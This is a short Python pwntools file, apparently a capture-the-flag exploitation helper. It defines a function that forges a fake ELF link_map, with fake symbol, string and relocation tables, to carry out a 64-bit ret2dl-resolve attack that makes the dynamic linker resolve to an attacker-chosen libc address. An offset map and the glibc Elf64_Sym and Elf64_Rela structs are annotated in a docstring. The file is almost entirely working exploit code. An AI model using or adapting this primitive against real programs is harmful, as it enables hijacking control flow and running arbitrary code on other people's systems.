from pwn import*
def build(fake,one_got,reloc_index,offset):
	target = fake + 0x28	
	fake_link_map  = p64(offset)
	fake_link_map  = fake_link_map.ljust(0x30,'\x00')
	fake_jmprel  = p64(target - offset)  ## offset
	fake_jmprel += p64(7)
	fake_jmprel += p64(0)
	fake_link_map += fake_jmprel
	fake_link_map  = fake_link_map.ljust(0x68,'\x00')
	fake_link_map += p64(fake)									# DT_STRTAB (just a pointer to satify the struct)
	fake_link_map += p64(fake +0x78 -8)							#fake_DT_SYMTAB
	fake_link_map += p64(one_got -8) 							# SYMTAB->st_other==libc_address
	fake_link_map += p64(fake +0x30-0x18 *reloc_index)			#point the fake SYMTAB
	fake_link_map  = fake_link_map.ljust(0xF8,'\x00')
	fake_link_map += p64(fake+0x80-8)							#fake_DT_JMPREL
	return fake_link_map
	
'''
linkmap:
	0x00: START
	0x00: l_addr (offset from libc_address to target address
	0x08: 
	0x10: 
	0x14:
	0x15:
	0x18:
	0x20:
	0x28: # target address here
	0x30: fake_jmprel #r_offset 
	0x38:             #r_info should be 7
	0x40:             #r_addend 0
	0x48: 
	0x68: P_DT_STRTAB = linkmap_addr(just a pointer)
	0x70: p_DT_SYMTAB = fake_DT_SYMTAB
	0xF8: p_DT_JMPREL = fake_DT_JMPREL
	0x100: END
--------------------------------------------------------------------------------------
typedef struct
		{
			Elf64_Word		st_name;		/* Symbol name (string tbl index) */
			unsigned char	st_info;		/* Symbol type and binding */
			unsigned char	st_other;		/* Symbol visibility */
			Elf64_Section	st_shndx;		/* Section index */
			Elf64_Addr		st_value;		/* Symbol value */
			Elf64_Xword 	st_size;		/* Symbol size */
		} Elf64_Sym;

typedef struct
		{
			Elf64_Addr		r_offset;		/* Address */
			Elf64_Xword		r_info;			/* Relocation type and symbol index */
			Elf64_Sxword	r_addend;		/* Addend */
		} Elf64_Rela;
--------------------------------------------------------------------------------------
'''



